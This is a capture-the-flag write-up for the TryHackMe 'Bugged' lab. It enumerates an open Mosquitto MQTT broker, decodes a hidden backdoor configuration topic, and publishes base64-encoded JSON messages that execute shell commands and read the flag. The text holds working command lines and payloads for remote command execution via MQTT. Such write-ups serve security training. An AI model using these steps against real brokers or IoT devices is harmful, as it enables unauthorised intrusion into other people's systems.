---
title: Bugged
description : A TryHackMe challenge focused on exploiting an insecure MQTT setup to gain command execution and capture the flag.
---

<img width="1793" height="294" alt="Screenshot From 2025-09-13 17-04-29" src="https://github.com/user-attachments/assets/f0f58501-d5e8-4584-a138-65d2d965498e" />


`Date : 13 Sep 2025`

Ever wondered what could go wrong if an MQTT broker is left wide open? In Bugged, we dive into a misconfigured IoT setup that gives us more access than intended — including the ability to run system commands and snatch the flag. Let’s get started!


### Table of Content

1. [Enumeration](#enumeration)  
   1.1 [MQTT](#mqtt)  
2. [Exploitation](#exploitation)  
3. [Conclusion](#conclusion)

### Enumeration 

**Nmap**

Let's first scan for the open ports on the server 

```bash
sudo nmap 10.10.111.216 -Pn -p- --min-rate 5000 -oN all-ports.txt
```

Output : 

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 12:47 IST
Nmap scan report for 10.10.111.216
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1883/tcp open  mqtt

Nmap done: 1 IP address (1 host up) scanned in 16.03 seconds
```

As we can see there are only two open ports :

1. Port 22/tcp : SSH
2. Port 1883/tcp mqtt

Now we can run default scripts for the service running on the server and also try to identify their version.

```bash
sudo nmap 10.10.111.216 -Pn -p 22,1883 --min-rate 5000 -sV -sC -oN specific-ports.txt
```


Output :

```
PORT     STATE SERVICE                  VERSION
22/tcp   open  ssh                      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:ce:c1:8b:c7:ba:b4:d9:d7:b5:81:8c:9f:9f:c2:a2 (RSA)
|   256 ce:d4:19:d2:71:f0:d6:bd:7e:e4:a8:0b:97:00:c1:4b (ECDSA)
|_  256 bf:5a:fa:26:88:50:b8:d5:f4:bc:04:60:30:f3:8b:9d (ED25519)
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/bytes/received/15min: 2475.71
|     $SYS/broker/load/connections/5min: 0.41
|     $SYS/broker/clients/total: 2
|     $SYS/broker/load/messages/received/1min: 88.70
|     $SYS/broker/clients/active: 2
|     storage/thermostat: {"id":13786674128964847315,"temperature":23.000786}
|     $SYS/broker/publish/bytes/sent: 283
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/subscriptions/count: 3
|     $SYS/broker/load/messages/received/5min: 83.25
|     $SYS/broker/clients/maximum: 2
|     $SYS/broker/messages/stored: 32
|     $SYS/broker/load/connections/1min: 1.83
|     $SYS/broker/load/sockets/5min: 0.41
|     $SYS/broker/load/publish/sent/1min: 21.93
|     $SYS/broker/messages/received: 1191
|     $SYS/broker/load/messages/sent/5min: 87.97
|     $SYS/broker/retained messages/count: 36
|     $SYS/broker/load/bytes/received/5min: 3891.85
|     $SYS/broker/load/publish/sent/15min: 1.59
|     $SYS/broker/bytes/sent: 6976
|     $SYS/broker/load/messages/sent/1min: 110.63
|     $SYS/broker/load/bytes/received/1min: 4030.35
|     $SYS/broker/messages/sent: 1242
|     patio/lights: {"id":6552629828854183038,"color":"RED","status":"OFF"}
|     $SYS/broker/store/messages/bytes: 173
|     $SYS/broker/load/publish/sent/5min: 4.71
|     $SYS/broker/bytes/received: 56128
|     $SYS/broker/uptime: 792 seconds
|     kitchen/toaster: {"id":11484846507786625388,"in_use":false,"temperature":154.45622,"toast_time":344}
|     $SYS/broker/store/messages/count: 32
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/publish/messages/sent: 52
|     frontdeck/camera: {"id":16862796498629369539,"yaxis":-93.65961,"xaxis":-175.08388,"zoom":4.7224693,"movement":false}
|     $SYS/broker/load/sockets/1min: 1.83
|     $SYS/broker/load/connections/15min: 0.16
|     $SYS/broker/load/bytes/sent/5min: 522.93
|     $SYS/broker/publish/bytes/received: 39955
|     $SYS/broker/load/bytes/sent/1min: 1238.34
|     $SYS/broker/load/messages/received/15min: 52.67
|     $SYS/broker/load/bytes/sent/15min: 274.77
|     $SYS/broker/load/messages/sent/15min: 54.26
|_    $SYS/broker/load/sockets/15min: 0.16
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is not much  interesting info about the SSH so we will move to **mqtt**.

#### MQTT

MQTT stands for Message Queuing Telemetry Transport. It is a lightweight communication protocol used for network communication between devices (especially in IoT), enabling efficient data transfer with minimal bandwidth and power consumption.

In MQTT, there are two main components:

1. Broker: Acts as the central server that receives all messages and routes them to the appropriate clients.
2. Client: A device or application that can publish messages to a topic and/or subscribe to topics to receive messages.

We can easily interact with the mqtt broker/server using mosquitto which is a part of MQTT utilities.

We can subsribe to all the topics uisng :

```bash
mosquitto_sub -h 10.10.111.216 -t  '#' -v
```

Output:

```
livingroom/speaker {"id":7230013946714803460,"gain":74}
storage/thermostat {"id":12528712607687060688,"temperature":24.256939}
patio/lights {"id":220303304000358740,"color":"WHITE","status":"OFF"}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
livingroom/speaker {"id":8739174168312335828,"gain":44}
storage/thermostat {"id":6441711874125947231,"temperature":23.3453}
kitchen/toaster {"id":14065460581930926939,"in_use":true,"temperature":153.54645,"toast_time":298}
patio/lights {"id":12077358384818774202,"color":"ORANGE","status":"ON"}
frontdeck/camera {"id":12495758585632175989,"yaxis":42.932663,"xaxis":125.57349,"zoom":1.2308611,"movement":false}
livingroom/speaker {"id":4605549766202354231,"gain":71}
storage/thermostat {"id":8098249339266899236,"temperature":24.145702}
kitchen/toaster {"id":3499012098957566313,"in_use":true,"temperature":149.38382,"toast_time":253}
storage/thermostat {"id":13885691828256444310,"temperature":24.171106}
patio/lights {"id":13026766258618871524,"color":"WHITE","status":"ON"}
.
.
.
```

we start getting messages from different topics but the most important message we got is


```javscript
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

This is base64 encoded we can either use the cli tool "base64" or use the [CyberChef](https://cyberchef.org).

<img width="904" height="648" alt="Screenshot From 2025-09-13 13-20-29" src="https://github.com/user-attachments/assets/ef8174ae-07a0-4d26-9796-a342bf4817e9" />


~ *Image 1 : Cyberchef* 


It's a JWT token with different parameters and values from which we can easily understand that this hints that we can execute custom command on the broker. 

Here `pub_topic` specify the topic where we have can publish our command and `sub_topic` specify the topic where we can subscribe to get the output of the command.

### Exploitation 

Let's first subscribe to the topic - 

```bash
mosquitto_sub -h 10.10.111.216 -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -v
```

Now we can try to send a command to the pub_topic - 

```bash
mosquitto_pub -h 10.10.111.216 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -msg "whoami"
```

This is what we recieved from the topic we subscribed to :

```bash
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```

It is base64 encoded so let's decode and see what we got -

```
echo "SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=" | base64 -d

Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

It is says the format is not valid and the valid format is -

```
{"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"}
```

and also it should be base64 encoded.

From Image 1 we can see we haev 3 possible commands - CMD, SYS, HELP

first we can try to execute HELP command to get some info 

```
mosquitto_pub -h 10.10.15.102 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "eyJpZCI6ICIwMCIsICJjbWQiOiAiSEVMUCIsICJhcmciOiAiIn0="
```

Response -

```
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ
```

Decode it :

```
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ==" | base64 -d

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}
```

Most interesting thing is the cmd command which can be used to execute the OS commands.

We can try to execute the "id" command 

```
mosquitto_pub -h 10.10.15.102 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m "eyJpZCI6ICIwMCIsICJjbWQiOiAiQ01EIiwgImFyZyI6ICJpZCJ9"
```

reponse :

```
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIeyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoidWlkPTEwMDAoY2hhbGxlbmdlKSBnaWQ9MTAwMChjaGFsbGVuZ2UpIGdyb3Vwcz0xMDAwKGNoYWxsZW5nZSlcbiJ9" | base64  -d

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)\n"}
```

As we can see the commadn got successfully executed and we are the user "challlenge"

Now we can read the flag which is usually stored as "flag.txt"

```
mosquitto_pub -h 10.10.15.102 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m  "eyJpZCI6ICIwMCIsICJjbWQiOiAiQ01EIiwgImFyZyI6ICJjYXQgfi9mbGFnLnR4dCJ9"
```

We got the flag - 

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{Redacted}\n"}
````

### Conclusion 

Through MQTT misconfiguration, we exploited the broker to execute system commands remotely and successfully retrieved the flag. This highlights the critical importance of securing MQTT topics and validating message formats.
